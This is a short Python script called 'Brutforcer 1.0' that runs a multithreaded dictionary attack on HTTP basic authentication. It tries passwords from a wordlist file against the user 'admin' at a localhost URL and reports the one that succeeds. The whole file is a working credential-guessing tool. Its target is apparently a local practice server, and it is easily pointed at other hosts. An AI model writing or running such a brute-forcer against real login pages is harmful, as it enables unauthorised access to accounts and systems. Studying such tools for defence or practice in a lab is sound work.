import requests
from threading import Thread
import sys
from termcolor import colored


global hit
hit = "1"


def banner():
    print("*******************************")
    print("*        Brutforcer 1.0       *")
    print("*******************************")


class request_performer(Thread):
    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        print("-" + self.password + "-")

    def run(self):
        global hit
        if hit == "1":
                r = requests.get(self.url, auth=(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print("[+] Password found - " + colored(self.password, 'green'))
                    sys.exit()
                else:
                    print("Not valid " + self.password)
                    i[0] = i[0] - 1


def start():
    banner()
    global url
    global user
    global threads
    global dictio

    dictio = 'harald.txt'
    threads = 5
    user = 'admin'
    url = 'http://localhost:9090/index.php'

    try:
         f = open(dictio, 'r')
         passwords = f.readlines()
    except:
        print("Failed opening file: " + dictio + "\n")
        sys.exit()
    launcher_thread(passwords, threads, user, url)


def launcher_thread(passwords, th, username, url):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
                if i[0] < th:
                    passwd = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passwd, username, url)
                    thread.start()


start()